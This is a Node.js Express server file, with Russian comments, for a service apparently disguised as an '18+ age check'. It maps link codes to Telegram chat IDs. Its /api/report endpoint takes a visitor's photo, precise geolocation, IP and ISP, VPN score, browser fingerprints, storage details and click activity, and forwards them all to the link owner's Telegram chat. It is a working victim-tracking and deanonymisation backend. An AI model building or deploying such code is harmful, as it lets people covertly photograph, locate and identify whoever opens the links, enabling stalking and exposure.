// === server/index.js (code -> chat_id, pretty /:code, понятные ошибки) ===
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
const STATIC_ORIGIN    = (process.env.STATIC_ORIGIN || '*').trim();
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
const DB_PATH          = process.env.DB_PATH || './data/links.db';
const PORT             = Number(process.env.PORT || 10000);

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// --- CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});
app.options('*', (_req, res) => res.sendStatus(200));

// --- cache headers for static
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// --- static
app.use(express.static(PUBLIC_DIR));
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
try {
  const dir = path.dirname(DB_PATH);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
} catch (e) {
  console.error('[db] mkdir failed for', DB_PATH, e);
}

console.log('[db] using', DB_PATH);
const db = new Database(DB_PATH);

// --- table (new scheme)
db.prepare(`
  CREATE TABLE IF NOT EXISTS user_codes (
    code       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    created_at INTEGER NOT NULL
  );
`).run();
db.prepare(`CREATE INDEX IF NOT EXISTS idx_user_codes_chat_id ON user_codes(chat_id);`).run();

// ---- optional migrate.sql (будет выполнен, если файл есть)
try {
  const migratePath = path.join(__dirname, 'migrate.sql');
  if (fs.existsSync(migratePath)) {
    console.log('[migrate] applying migrate.sql...');
    db.exec(fs.readFileSync(migratePath, 'utf8'));
  }
} catch (e) {
  console.error('[migrate] failed', e);
}

// ==== helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

// === Telegram helpers ===
async function tgSendHTML({ chatId, html }) {
  if (!BOT_TOKEN) throw new Error('No TG token');
  if (!chatId) throw new Error('Missing chat_id');
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const r = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type':'application/json' },
    body: JSON.stringify({
      chat_id: String(chatId),
      text: html,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    })
  });
  const data = await r.json().catch(()=>null);
  if (!data?.ok) throw new Error(`TG sendMessage failed: ${r.status}`);
  return data;
}

// NOTE: в Node 20/22 fetch/FormData/Blob — глобальные.
async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('No BOT token on server');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

function extractReqIp(req) {
  const xff = (req.headers['x-forwarded-for'] || '').toString();
  const forwardedFor = xff.split(',')[0]?.trim() || null;
  const ip = req.headers['cf-connecting-ip']
    || forwardedFor
    || req.ip
    || req.connection?.remoteAddress
    || null;
  const country = req.headers['cf-ipcountry'] || null;
  return { ip, forwardedFor, country };
}

// Собираем подробный HTML-отчёт на бэке, если фронт не прислал tg_snapshot
function buildTgHtml(payload, reqMeta = {}) {
  const p   = payload || {};
  const cp  = p.client_profile || {};
  const dc  = p.device_check || {};
  const pub = cp.publicIp || {};
  const conn = cp.connection || {};
  const scr  = cp.screen || {};
  const vpn  = cp.vpnProxy || {};
  const tz   = cp.timezone || p.timezone || '-';

  const ua   = p.userAgent || cp.userAgent || '-';
  const langs = Array.isArray(cp.languages) ? cp.languages.join(', ') : (p.language || '-');
  const ref   = (cp.referrer ?? p.referrer) || '-';

  const stor = cp.storageSnapshot || {};
  const cookiesLen = (stor.cookies || '').length;
  const lsKeys = stor.local ? Object.keys(stor.local).length : 0;
  const ssKeys = stor.session ? Object.keys(stor.session).length : 0;

  const canvas = cp.canvas || {};
  const webgl  = cp.webgl || {};

  const lines = [];
  lines.push(`<b>Новый отчёт 18+ проверка</b>`);
  lines.push(`Code: <code>${escapeHTML(String(p.code || '-').toUpperCase())}</code>`);
  lines.push(`Время: <code>${new Date().toISOString()}</code>`);
  lines.push('');

  // IP / оператор
  const reqIp = reqMeta.ip || null;
  const xffIp = reqMeta.forwardedFor || null;
  lines.push(`<b>IP</b>: <code>${escapeHTML(pub.ip || reqIp || '-')}</code>${xffIp && xffIp !== pub.ip ? ` (xff: <code>${escapeHTML(xffIp)}</code>)` : ''}`);
  lines.push(`<b>CC</b>: <code>${escapeHTML(pub.country || reqMeta.country || '-')}</code>  <b>ISP</b>: <code>${escapeHTML(pub.isp || pub.org || '-')}</code>`);
  lines.push(`<b>TZ</b>: <code>${escapeHTML(tz)}</code>`);
  lines.push(`<b>VPN/Proxy</b>: <code>${escapeHTML(vpn.label || '-')}</code> (score=${vpn.score ?? '-'})`);

  // Браузер/ОС/язык
  lines.push(`<b>UA</b>: <code>${escapeHTML(ua).slice(0,500)}</code>`);
  lines.push(`<b>Platform</b>: <code>${escapeHTML(p.platform || cp.userAgentData?.platform || '-')}</code>  iOS: <code>${escapeHTML(p.iosVersion ?? cp.iosVersion ?? '-')}</code>  Safari: <code>${escapeHTML(String(p.isSafari))}</code>`);
  lines.push(`<b>Языки</b>: <code>${escapeHTML(langs)}</code>`);

  // Экран/сеть
  lines.push(`<b>Экран</b>: ${scr.width || '?'}×${scr.height || '?'} (DPR=${cp.dpr ?? '?'})  Viewport: ${cp.viewport?.w || '?'}×${cp.viewport?.h || '?'}`);
  lines.push(`<b>Сеть</b>: type=<code>${escapeHTML(conn.type ?? '-')}</code>, eff=<code>${escapeHTML(conn.effectiveType ?? '-')}</code>, rtt=<code>${escapeHTML(conn.rtt ?? '-')}</code>ms, down=<code>${escapeHTML(conn.downlink ?? '-')}</code>Mb/s, saveData=<code>${conn.saveData ? 'on' : 'off'}</code>`);

  // Фингерпринты / хранилища
  lines.push(`<b>Canvas</b>: hash=<code>${escapeHTML(canvas.hash || '-')}</code> (len=${canvas.rawLen ?? 0})`);
  lines.push(`<b>WebGL</b>: <code>${escapeHTML(webgl.vendor || webgl.vendorMasked || '-')}</code> / <code>${escapeHTML(webgl.renderer || webgl.rendererMasked || '-')}</code>`);
  lines.push(`<b>Cookies</b>: ${cookiesLen} символов; <b>localStorage</b>: ${lsKeys} ключ.; <b>sessionStorage</b>: ${ssKeys} ключ.`);

  // Referrer / активность
  const pagesCnt  = cp.activity?.pages?.length || 0;
  const clicksCnt = cp.activity?.clicks?.length || 0;
  lines.push(`<b>Referrer</b>: <code>${escapeHTML(ref)}</code>  <b>Pages</b>: ${pagesCnt}  <b>Clicks</b>: ${clicksCnt}`);

  // Device-check
  lines.push(`<b>DeviceCheck</b>: score=<code>${dc.score ?? '-'}</code>`);
  if (Array.isArray(dc.reasons) && dc.reasons.length) {
    lines.push(`• ${escapeHTML(dc.reasons.slice(0,3).join(' • '))}`);
  }

  // Гео
  if (p.geo && typeof p.geo.lat === 'number' && typeof p.geo.lon === 'number') {
    lines.push(`<b>Гео</b>: ${p.geo.lat.toFixed(6)}, ${p.geo.lon.toFixed(6)} (±${p.geo.acc ?? '?'}м)`);
  }

  let html = lines.join('\n');
  if (html.length > 3800) html = html.slice(0, 3790) + '…'; // запас до лимита Telegram ~4096
  return html;
}

// ==== health & debug ====
app.get('/health', (_req, res) => res.json({ ok: true }));
app.get('/api/debug/db', (req, res) => {
  try {
    const size = fs.existsSync(DB_PATH) ? fs.statSync(DB_PATH).size : 0;
    const codes = db.prepare('SELECT COUNT(*) AS c FROM user_codes').get().c;
    res.json({ ok:true, DB_PATH, size, codes });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// === API: client-ip (для фронта)
app.get('/api/client-ip', (req, res) => {
  try {
    const { ip, forwardedFor, country } = extractReqIp(req);
    // ISP можно пробрасывать заголовком X-ISP с реверс-прокси, если нужно
    const isp = req.headers['x-isp'] || null;
    res.json({ ip, country: country || null, region: null, isp, forwardedFor });
  } catch (e) {
    res.status(500).json({ ok:false, error:String(e) });
  }
});

// ==== Admin: register-code ====
app.post('/api/register-code', requireAdminSecret, (req, res) => {
  try {
    const { code, chatId } = req.body || {};
    if (!code || !/^[A-Z0-9\-]{3,40}$/i.test(code)) {
      return res.status(400).json({ ok:false, error:'Invalid code' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok:false, error:'Invalid chatId' });
    }
    db.prepare('INSERT OR REPLACE INTO user_codes(code, chat_id, created_at) VALUES(?,?,?)')
      .run(String(code).toUpperCase(), String(chatId), Date.now());
    res.json({ ok:true, code:String(code).toUpperCase(), chatId:String(chatId) });
  } catch (e) {
    console.error('[register-code] error:', e);
    res.status(500).json({ ok:false, error:'Internal' });
  }
});

// ==== Pretty URL: /:code -> index.html?code=... ====
app.get('/:code([a-zA-Z0-9\\-]{3,40})', (req, res) => {
  const code = req.params.code.toString();
  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const injected = html.replace(
    /<head>/i,
    `<head><script>history.replaceState(null,'','/index.html?code=${code}');</script>`
  );
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(injected);
});

// === API: tg-relay (опционально: фронт может прислать готовый HTML снапшот)
app.post('/api/tg-relay', async (req, res) => {
  try {
    const { code, html } = req.body || {};
    if (!code || typeof html !== 'string') return res.status(400).json({ ok:false, error:'bad payload' });
    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?').get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });
    await tgSendHTML({ chatId: String(row.chat_id), html: html.slice(0, 3800) });
    res.json({ ok:true });
  } catch (e) {
    console.error('[tg-relay] error:', e);
    res.status(500).json({ ok:false, error: e.message || 'internal' });
  }
});

// ==== API: report (фото + подробный текст владельцу кода) ====
app.post('/api/report', async (req, res) => {
  try {
    const {
      userAgent, platform, iosVersion, isSafari,
      geo, photoBase64, note, code,
      client_profile, device_check, tg_snapshot
    } = req.body || {};

    if (!code)        return res.status(400).json({ ok:false, error: 'No code' });
    if (!photoBase64) return res.status(400).json({ ok:false, error: 'No photoBase64' });

    const row = db.prepare('SELECT chat_id FROM user_codes WHERE code = ?')
      .get(String(code).toUpperCase());
    if (!row) return res.status(404).json({ ok:false, error:'Unknown code' });

    const chatId = String(row.chat_id);

    // 1) Фото с коротким caption (как раньше)
    const caption = [
      '<b>Новый отчёт 18+ проверка</b>',
      `Code: <code>${escapeHTML(String(code).toUpperCase())}</code>`,
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean).join('\n');

    const buf = b64ToBuffer(photoBase64);
    await sendPhotoToTelegram({ chatId, caption, photoBuf: buf });

    // 2) Подробный текст (если фронт прислал tg_snapshot — используем его; иначе собираем сами)
    const reqMeta = extractReqIp(req);
    const html = (typeof tg_snapshot === 'string' && tg_snapshot.trim().length)
      ? tg_snapshot.trim().slice(0, 3800)
      : buildTgHtml(
          { userAgent, platform, iosVersion, isSafari, geo, note, code, client_profile, device_check },
          reqMeta
        );

    await tgSendHTML({ chatId, html });

    res.json({ ok: true, delivered: true });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) return res.status(404).send('Not Found');
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
  console.log(`[server] PUBLIC_BASE: ${PUBLIC_BASE}`);
});
